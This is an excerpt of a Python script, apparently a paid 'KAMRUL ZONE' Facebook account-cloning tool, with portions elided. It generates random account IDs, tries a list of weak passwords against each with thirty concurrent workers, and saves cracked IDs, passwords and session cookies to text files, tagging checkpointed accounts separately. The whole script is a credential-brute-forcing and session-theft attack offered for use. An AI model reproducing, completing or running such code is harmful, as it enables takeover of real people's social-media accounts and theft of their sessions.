...
##--------------( KAMRUL ZONE )-------------##
sys.stdout.write('\x1b]2; (KAMRUL ZONE) \x07')
...
{45*'-'}
{X} FACEBOOK    : KAMRUL HASAN MAHI
{X} FEATURE     : FILE{G}〤{W}RANDOM
{X} VERSION     : {Y}2.1 {G}PAID
{X} GITHUB      : RJ-KAMRUL
{45*'-'}"""
line = f"{W}{45*'-'}"
##--------------( KAMRUL ZONE )-------------##
...
def FileCloning():
    banner();dtls()
    print(f"{X} EXAMPLE   : /sdcard/KAMRUL.txt")
...
def Cloning(value):
    if value.lower() == "nepal":
        ...
        with tani(max_workers=30) as My_Tanisha:
            ...
            for love in bou:
                ids = code + love
                passlist = [ids,ids[:8],ids[:7],ids[:6],love,love[1:],love[2:],'bangladesh','bangla','777888','@@@@####','77889900','@@@123','first@@@']
                if "methodA" in methods:My_Tanisha.submit(randA,ids,passlist)
                elif "methodB" in methods:My_Tanisha.submit(randB,ids,passlist)
                else:My_Tanisha.submit(randA,ids,passlist)
        print('\n')
...
def methodA(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{X}-{N}[{random.choice([N,R,G,Y,B,I,S])}KAMRUL-M1{N}]{W}-{N}[{Y}{loop}{N}]{W}-{N}[{W}OK:{A}{len(oks)}{N}]")
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        last = names.split(' ')[1]
        for pw in passlist:
            ...
            if 'access_token' in Neon:
                ...
                print(f"\r\r {A}[KAMRUL-OK] • {ids} • {pas}")
                open('/sdcard/KAMRUL-FILE-M1-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in Neon['error']['message']:
                print(f"\r\r {D}[KAMRUL-CP] • {ids} • {pas}")
...
def methodB(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{X}-{N}[{random.choice([N,R,G,Y,B,I,S])}KAMRUL-M2{N}]{W}-{N}[{Y}{loop}{N}]{W}-{N}[{W}OK:{A}{len(oks)}{N}]")
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        last = names.split(' ')[1]
        for pw in passlist:
            ...
            if 'access_token' in Neon:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in Neon["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                print(f"\r\r {A}[KAMRUL-OK] • {ids} • {pas}")
                open('/sdcard/KAMRUL-FILE-M2-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in Neon['error']['message']:
                print(f"\r\r {D}[KAMRUL-CP] • {ids} • {pas}")
...
def methodC(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{X}-{N}[{random.choice([N,R,G,Y,B,I,S])}KAMRUL-M3{N}]{W}-{N}[{Y}{loop}{N}]{W}-{N}[{W}OK:{A}{len(oks)}{N}]")
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        last = names.split(' ')[1]
        for pw in passlist:
            ...
            if 'access_token' in Neon:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in Neon["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                print(f"\r\r {A}[KAMRUL-OK] • {ids} • {pas}")
                open('/sdcard/KAMRUL-FILE-M3-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in Neon['error']['message']:
                print(f"\r\r {D}[KAMRUL-CP] • {ids} • {pas}")
        ...
        for pas in passlist:
            ...
            if "access_token" in po:
                ...
                if uid in str(oks):break
                    ...
                    if "Photoshop" in res:
                        print(f"\r\r{X}-{A}[KAMRUL-OK] • {uid} • {pas}")
                        if "y" in apk:
                            print(f"\r\r{X}-{W}[🍪] \x1b[38;5;47m{cookie}")
                            check_apk(cookie)
                        else:pass
                        open('/sdcard/KAMRUL-RNDM-M1-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                        oks.append(uid)
                    else:pass
                ...
                print(f"\r\r{X}-{D}[KAMRUL-CP] • {uid} • {pas}")
                open('/sdcard/KAMRUL-RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
                cps.append(uid)
                break
            else:continue
        loop+=1
        ...
        for pas in passlist:
            ...
            if "c_user" in log_cookies:
                ...
                if idf in str(cps):break
                    ...
                    print(f"\r\r{X}-{D}[KAMRUL-CP] • {idf} • {pas}")
                    open('/sdcard/KAMRUL-RNDM-CP.txt','a').write(idf+'|'+pas+'\n')
                    cps.append(idf)
                    break
            else:continue
        loop+=1
